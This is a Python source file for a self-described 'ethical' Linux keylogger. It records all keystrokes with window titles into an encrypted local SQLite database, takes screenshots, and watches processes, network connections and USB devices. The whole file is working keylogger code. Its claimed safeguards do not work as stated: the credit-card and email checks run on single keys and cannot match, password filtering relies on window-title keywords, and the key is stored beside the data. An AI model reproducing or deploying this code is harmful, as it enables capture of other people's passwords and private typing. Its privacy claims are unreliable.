#!/usr/bin/env python3
"""
Advanced Ethical Keylogger for Linux Systems
Records keystrokes, window titles, and system events with encryption

Made By Vision
GitHub: github.com/vision-dev1
Website: https://visionkc.com.np
"""

import os
import sys
import time
import json
import sqlite3
import logging
import threading
from datetime import datetime
from cryptography.fernet import Fernet
import psutil
import re
from pynput import keyboard
import subprocess

# Configure logging
logging.basicConfig(
    filename='keylogger.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class EthicalKeylogger:
    def __init__(self):
        self.log_buffer = []
        self.running = False
        self.db_path = "keylogs.db"
        self.key_path = "secret.key"
        self.screenshot_counter = 0
        
        # Initialize database
        self.init_database()
        
        # Load or generate encryption key
        self.key = self.load_key()
        self.cipher_suite = Fernet(self.key)
        
        # Pattern detection
        self.credit_card_pattern = re.compile(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b')
        self.email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
        
        # Special keys mapping
        self.special_keys = {
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.space: ' ',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.alt: '[ALT]',
            keyboard.Key.caps_lock: '[CAPS_LOCK]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.cmd: '[CMD]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.home: '[HOME]',
            keyboard.Key.end: '[END]',
            keyboard.Key.page_up: '[PAGE_UP]',
            keyboard.Key.page_down: '[PAGE_DOWN]',
            keyboard.Key.up: '[UP_ARROW]',
            keyboard.Key.down: '[DOWN_ARROW]',
            keyboard.Key.left: '[LEFT_ARROW]',
            keyboard.Key.right: '[RIGHT_ARROW]',
            keyboard.Key.f1: '[F1]',
            keyboard.Key.f2: '[F2]',
            keyboard.Key.f3: '[F3]',
            keyboard.Key.f4: '[F4]',
            keyboard.Key.f5: '[F5]',
            keyboard.Key.f6: '[F6]',
            keyboard.Key.f7: '[F7]',
            keyboard.Key.f8: '[F8]',
            keyboard.Key.f9: '[F9]',
            keyboard.Key.f10: '[F10]',
            keyboard.Key.f11: '[F11]',
            keyboard.Key.f12: '[F12]'
        }

    def init_database(self):
        """Initialize the encrypted SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                window_title TEXT,
                key_data TEXT NOT NULL,
                is_encrypted BOOLEAN DEFAULT 1
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                event_type TEXT NOT NULL,
                event_data TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                alert_type TEXT NOT NULL,
                alert_data TEXT
            )
        ''')
        conn.commit()
        conn.close()

    def load_key(self):
        """Load or generate encryption key"""
        if os.path.exists(self.key_path):
            with open(self.key_path, 'rb') as key_file:
                key = key_file.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_path, 'wb') as key_file:
                key_file.write(key)
        return key

    def encrypt_data(self, data):
        """Encrypt data using Fernet"""
        return self.cipher_suite.encrypt(data.encode()).decode()

    def get_active_window(self):
        """Get the active window title using xdotool"""
        try:
            result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                  capture_output=True, text=True, timeout=1)
            return result.stdout.strip()
        except Exception as e:
            logging.error(f"Error getting active window: {e}")
            return "Unknown Window"

    def detect_password_field(self, window_title):
        """Detect if we're in a password field (heuristic approach)"""
        password_indicators = ['password', 'passwd', 'login', 'sign in', 'auth']
        title_lower = window_title.lower()
        for indicator in password_indicators:
            if indicator in title_lower:
                return True
        return False

    def detect_patterns(self, text):
        """Detect sensitive patterns without storing them"""
        credit_cards = self.credit_card_pattern.findall(text)
        emails = self.email_pattern.findall(text)
        
        alerts = []
        if credit_cards:
            alert_msg = f"Credit card pattern detected: {len(credit_cards)} matches"
            alerts.append(("CREDIT_CARD", alert_msg))
            logging.warning(alert_msg)
            
        if emails:
            alert_msg = f"Email pattern detected: {len(emails)} matches"
            alerts.append(("EMAIL", alert_msg))
            logging.warning(alert_msg)
            
        # Store alerts in database
        if alerts:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            timestamp = datetime.now().isoformat()
            for alert_type, alert_data in alerts:
                cursor.execute('''
                    INSERT INTO alerts (timestamp, alert_type, alert_data)
                    VALUES (?, ?, ?)
                ''', (timestamp, alert_type, alert_data))
            conn.commit()
            conn.close()
            
        return len(credit_cards) > 0 or len(emails) > 0

    def log_keystroke(self, key_data):
        """Log a keystroke to the database"""
        timestamp = datetime.now().isoformat()
        window_title = self.get_active_window()
        
        # Check if we're in a password field
        if self.detect_password_field(window_title):
            logging.warning("Password field detected - not recording keystrokes")
            return
            
        # Detect sensitive patterns
        if self.detect_patterns(key_data):
            logging.info("Sensitive pattern detected - not storing keystroke")
            return
            
        # Encrypt the keystroke data
        encrypted_data = self.encrypt_data(key_data)
        
        # Store in database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (timestamp, window_title, key_data, is_encrypted)
            VALUES (?, ?, ?, ?)
        ''', (timestamp, window_title, encrypted_data, True))
        conn.commit()
        conn.close()

    def log_system_event(self, event_type, event_data):
        """Log system events"""
        timestamp = datetime.now().isoformat()
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO system_events (timestamp, event_type, event_data)
            VALUES (?, ?, ?)
        ''', (timestamp, event_type, event_data))
        conn.commit()
        conn.close()
        logging.info(f"System event logged: {event_type} - {event_data}")

    def take_screenshot(self):
        """Take a screenshot using scrot"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}_{self.screenshot_counter}.png"
            subprocess.run(['scrot', filename], check=True)
            self.log_system_event("SCREENSHOT", f"Screenshot saved as {filename}")
            self.screenshot_counter += 1
        except Exception as e:
            logging.error(f"Error taking screenshot: {e}")

    def on_press(self, key):
        """Handle key press events"""
        if not self.running:
            return False
            
        try:
            # Handle special keys
            if key in self.special_keys:
                key_data = self.special_keys[key]
                
                # Handle ESC key to stop logging
                if key == keyboard.Key.esc:
                    print("\n[!] ESC pressed. Stopping keylogger...")
                    self.stop()
                    return False
                    
                # Handle F12 for screenshots
                if key == keyboard.Key.f12:
                    self.take_screenshot()
                    return
                    
            else:
                # Handle regular keys
                try:
                    key_data = key.char
                except AttributeError:
                    key_data = f"[{key}]"
                    
            # Log the keystroke
            self.log_keystroke(key_data)
            
        except Exception as e:
            logging.error(f"Error in on_press: {e}")

    def monitor_system(self):
        """Monitor system events in a separate thread"""
        previous_processes = set()
        previous_networks = set()
        previous_usb_devices = set()
        
        while self.running:
            try:
                # Monitor new processes
                current_processes = set([p.info['name'] for p in psutil.process_iter(['name'])])
                new_processes = current_processes - previous_processes
                
                for proc in new_processes:
                    if 'terminal' in proc.lower() or 'bash' in proc.lower() or 'shell' in proc.lower():
                        self.log_system_event("TERMINAL_OPENED", f"Terminal process started: {proc}")
                        
                previous_processes = current_processes
                
                # Monitor network connections
                current_networks = set([conn.laddr.ip for conn in psutil.net_connections() 
                                      if conn.laddr and conn.laddr.ip != '127.0.0.1'])
                new_networks = current_networks - previous_networks
                
                if new_networks:
                    self.log_system_event("NETWORK_ACTIVITY", f"New network connections: {', '.join(new_networks)}")
                    
                previous_networks = current_networks
                
                # Monitor USB devices (Linux specific)
                try:
                    current_usb = set()
                    if os.path.exists('/dev/disk/by-id'):
                        usb_devices = os.listdir('/dev/disk/by-id')
                        current_usb = set([dev for dev in usb_devices if dev.startswith('usb')])
                        
                    new_usb = current_usb - previous_usb_devices
                    if new_usb:
                        self.log_system_event("USB_INSERTED", f"New USB devices: {', '.join(new_usb)}")
                        
                    previous_usb_devices = current_usb
                except Exception as e:
                    pass  # USB monitoring failed, continue silently
                    
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                logging.error(f"Error in system monitoring: {e}")
                time.sleep(5)

    def start(self):
        """Start the keylogger"""
        if self.running:
            print("[!] Keylogger is already running")
            return
            
        self.running = True
        print("[*] Starting ethical keylogger...")
        print("[*] Press ESC to stop logging")
        print("[*] Press F12 to take a screenshot")
        
        # Start system monitoring in a separate thread
        monitor_thread = threading.Thread(target=self.monitor_system)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop(self):
        """Stop the keylogger"""
        self.running = False
        print("[*] Keylogger stopped")
        logging.info("Keylogger stopped")

def main():
    """Main function"""
    if not os.geteuid() == 0:
        print("[!] This script requires root privileges for some system monitoring features")
        print("[*] Running in limited mode...")
    
    keylogger = EthicalKeylogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Stopping...")
        keylogger.stop()
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        print(f"[!] Error occurred: {e}")
        keylogger.stop()

if __name__ == "__main__":
    main()